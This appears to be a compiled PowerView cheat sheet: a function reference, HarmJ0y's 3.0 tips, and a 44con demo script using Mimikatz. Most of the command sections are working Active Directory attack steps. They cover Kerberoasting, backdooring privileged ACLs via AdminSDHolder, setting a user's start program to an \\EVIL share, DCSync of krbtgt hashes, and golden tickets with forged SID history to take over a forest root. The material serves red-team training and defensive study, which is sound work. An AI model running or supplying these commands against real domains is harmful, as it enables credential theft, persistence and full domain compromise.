PowerView


- Misc Functions
Export-PowerViewCSV              Thread-safe CSV append
Set-MacAttribute                 Sets MAC attributes for a file based on another file or input (from Powersploit)
Copy-ClonedFile                  Copies a local file to a remote location, matching MAC properties
Get-IPAddress                    Resolves a hostname to an IP
Test-Server                      Tests connectivity to a specified server
Convert-NameToSid                Converts a given user/group name to a security identifier (SID)
Convert-SidToName                Converts a security identifier (SID) to a group/user name
Convert-NT4toCanonical           Converts a user/group NT4 name (i.e. dev/john) to canonical format
Get-Proxy                        Enumerates local proxy settings
Get-PathAcl                      Get the ACLs for a local/remote file path with optional group recursion
Get-UserProperty                 Returns all properties specified for users, or a set of user:prop names
Get-ComputerProperty             Returns all properties specified for computers, or a set of computer:prop names
Find-InterestingFile             Search a local or remote path for files with specific terms in the name
Invoke-CheckLocalAdminAccess     Check if the current user context has local administrator access to a specified host
Get-DomainSearcher               Builds a proper ADSI searcher object for a given domain
Get-ObjectAcl                    Returns the ACLs associated with a specific active directory object
Add-ObjectAcl                    Adds an ACL to a specified active directory object
Get-LastLoggedOn                 Return the last logged on user for a target host
Get-CachedRDPConnection 		   Queries all saved RDP connection entries on a target host
Invoke-ACLScanner                Enumerate -1000+ modifable ACLs on a specified domain
Get-GUIDMap                      Returns a hash table of current GUIDs -> display names
Get-DomainSID                    Return the SID for the specified domain
Invoke-ThreadedFunction          Helper that wraps threaded invocation for other functions

- net * Functions
Get-NetDomain                    Gets the name of the current user's domain
Get-NetForest                    Gets the forest associated with the current user's domain
Get-NetForestDomain              Gets all domains for the current forest
Get-NetDomainController          Gets the domain controllers for the current computer's domain
Get-NetUser                      Returns all user objects, or the user specified (wildcard specifiable)
Add-NetUser                      Adds a local or domain user
Get-NetComputer                  Gets a list of all current servers in the domain
Get-NetPrinter                   Gets an array of all current computers objects in a domain
Get-NetOU                        Gets data for domain organization units
Get-NetSite                      Gets current sites in a domain
Get-NetSubnet                    Gets registered subnets for a domain
Get-NetGroup                     Gets a list of all current groups in a domain
Get-NetGroupMember               Gets a list of all current users in a specified domain group
Get-NetLocalGroup                Gets the members of a localgroup on a remote host or hosts
Add-NetGroupUser                 Adds a local or domain user to a local or domain group
Get-NetFileServer                Get a list of file servers used by current domain users
Get-DFSshare                     Gets a list of all distribute file system shares on a domain
Get-NetShare                     Gets share information for a specified server
Get-NetLoggedon                  Gets users actively logged onto a specified server
Get-NetSession                   Gets active sessions on a specified server
Get-NetRDPSession                Gets active RDP sessions for a specified server (like qwinsta)
Get-NetProcess                   Gets the remote processes and owners on a remote server
Get-UserEvent                    Returns logon or TGT events from the event log for a specified host
Get-ADObject                     Takes a domain SID and returns the user, group, or computer object associated with it
Set-ADObject                     Takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified
                                   'PropertyName' to a specified 'PropertyValue'

- GPO functions
Get-GptTmpl                      Parses a GptTmpl.inf to a custom object
Get-NetGPO                       Gets all current GPOs for a given domain
Get-NetGPOGroup                  Gets all GPOs in a domain that set "Restricted Groups" on target machines
Find-GPOLocation                 Takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation
Find-GPOComputerAdmin            Takes a computer and determines who has admin rights over it through GPO enumeration
Get-DomainPolicy                 Returns the default domain or DC policy

- User-Hunting Functions
Invoke-UserHunter                Finds machines on the local domain where specified users are logged into, and can optionally check if the current
                                   user has local admin access to found machines
Invoke-StealthUserHunter         Finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for
                                   particular users
Invoke-ProcessHunter             Hunts for processes with a specific name or owned by a specific user on domain machines
Invoke-UserEventHunter           Hunts for user logon events in domain controller event logs

- Domain Trust Functions
Get-NetDomainTrust               Gets all trusts for the current user's domain
Get-NetForestTrust               Gets all trusts for the forest associated with the current user's domain
Find-ForeignUser                 Enumerates users who are in groups outside of their principal domain
Find-ForeignGroup                Enumerates all the members of a domain's groups and finds users that are outside of the queried domain
Invoke-MapDomainTrust            Try to build a relational mapping of all domain trusts

- MetaFunctions
Invoke-ShareFinder               Finds (non-standard) shares on hosts in the local domain
Invoke-FileFinder                Finds potentially sensitive files on hosts in the local domain
Find-LocalAdminAccess            Finds machines on the domain that the current user has local admin access to
Find-ManagedSecurityGroups       Searches for active directory security groups which are managed and identify users who have write access to
                                   those groups (i.e. the ability to add or remove members)
Find-UserField                   Searches a user field for a particular term
Find-ComputerField               Searches a computer field for a particular term
Get-ExploitableSystem            Finds systems likely vulnerable to common exploits
Invoke-EnumerateLocalAdmin       Enumerates members of the local Administrators groups across all mach
------------------------------------------------------------------------------------------------------------------------------------------------------

# PowerView-3.0 tips and tricks by HarmJ0y

New function naming schema:
   Verbs:
      Get              Retrieve full raw data sets
      Find             ‘find’ specific data entries in a data set
      Add              Add a new object to a destination
      Set              Modify a given object
      Invoke           Lazy catch-all
   Nouns:
      Verb-Domain*     Indicates LDAP/.NET querying methods are being executed
      Verb-WMI*        Indicates WMI is being used under the hood to execute enumeration
      Verb-Net*        Indicates Win32 API access is being used under the hood

# Get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity <User/Group>

# Get all the effective members of a group, 'recursing down'
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

# Retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# Get all users with passwords changed > 1 year ago, returning SAM account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset

# All enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# All disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# All users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# All users that *don't* require smart card authentication, only returning SAM account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# Use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# Find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN

# Check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# Find any users/computers with constrained delegation st
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# Return the local *groups* of a remote server
Get-NetLocalGroup SERVER.domain.local

# Return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

# Find-DomainUserLocation == old Invoke-UserHunter
# Enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# Hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

# Find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}

# Enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# Turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# Enumerate the current DC policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the DC

# Enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.

# Enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP

# Export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# Use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential

# Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local

# Grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose

# Audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs

# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All

# Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# Find linked domain admin accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# Save a PowerView object to disk for later usage
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# Find all policies applied to a current machine
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# Enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name

# Enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   Query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # Extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # Check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # Enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# If running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# Enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

# Set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 @scerazy
------------------------------------------------------------------------------------------------------------------------------------------------------

HarmJ0y/44con_demo.ps1

# Import PowerView and Mimikatz
Import-Module .\powerview.ps1
Import-Module .\mimikatz.ps1

# Map all reachable domain trusts
Invoke-MapDomainTrust

# Enumerate groups with 'foreign' users users, and convert the foreign principal SIDs to names
Find-ForeignGroup -Domain external.local
Find-ForeignGroup -Domain external.local | Select-Object -ExpandProperty UserName | Convert-SidToName

# Gather information for jwarner.a (his SID and group IDs) so we can impersonate him later
Get-NetUser jwarner.a -Domain testlab.local
Get-NetGroup -UserName jwarner.a -Domain testlab.local | Convert-NameToSid | fl

# dcsync the krbtgt hash from the dev.testlab.local child domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dev\krbtgt"'

# Enumerate the domain SIDs for dev.testlab.local and testlab.local
"dev\krbtgt" | Convert-NameToSid | fl
"testlab\krbtgt" | Convert-NameToSid | fl

# Create a Golden Ticket for a non-existent DEV user, and set the SIDHistory to 'Enterprise Admins' for testlab.local
# This lets us hop up the trust and compromise the forest root
Invoke-Mimikatz -Command '"kerberos::golden /user:nonexistent /domain:dev.testlab.local /sid:S-1-5-21-339048670-1233568108-4141518690 /krbtgt:fbf3ab8e6dd58ebee6f792837ba492b7 /sids:S-1-5-21-890171859-3433809279-3366196753-519 /ptt"'

# Enumerate the DCs for testlab.local and confirm access
Get-NetDomainController -Domain testlab.local
dir \\PRIMARY.testlab.local\C$

# dcsync the krbtgt hash for testlab.local
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:testlab.local /user:testlab\krbtgt"'

# Purge the existing Golden Ticket
Invoke-Mimikatz -Command '"kerberos::purge"'

# Create a Golden Ticket for jwarner.a, using the information enumerated earlier so ticket parameters match
Invoke-Mimikatz -Command '"kerberos::golden /user:jwarner.a /domain:testlab.local /id:1116 /groups:513,1117 /sid:S-1-5-21-890171859-3433809279-3366196753 /krbtgt:c74a635537214e6dbf488b646fa0157f /ptt"'

# dcsync the krbtgt hash from the external.local forest trust
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:external\krbtgt"'
------------------------------------------------------------------------------------------------------------------------------------------------------

# Presentations

BSides LV 2015             Building an Empire with PowerShell                               www.youtube.com/watch?v=Pq9t59w0mUI
BSides DC 2015             Bridging the Gap: Lessons in Adversarial Tradecraft              www.youtube.com/watch?v=xHkRhRo3l8o
BSides DC 2015             It, Do it Live (PowerShell Digital Forensics)                    www.youtube.com/watch?v=RcDq9GgiUB4
PowerShell Summit 2016     Digital Forensics with PowerShell                                www.youtube.com/watch?v=gm9A7FaWTkY
BSides LV 2016             Building an EmPyre with Python                                   www.youtube.com/watch?v=79qzgVTP3Yc
DerbyCon 2016              A Year in the Empire                                             www.youtube.com/watch?v=ngvHshHCt_8
DerbyCon 2016              Living Off the Land 2 A Minimalists Guide to Windows Defense     www.youtube.com/watch?v=dt-wMJwpX7g
DerbyCon 2016              Attacking EvilCorp: Anatomy of a Corporate Hack                  www.youtube.com/watch?v=nJSMJyRNvlM

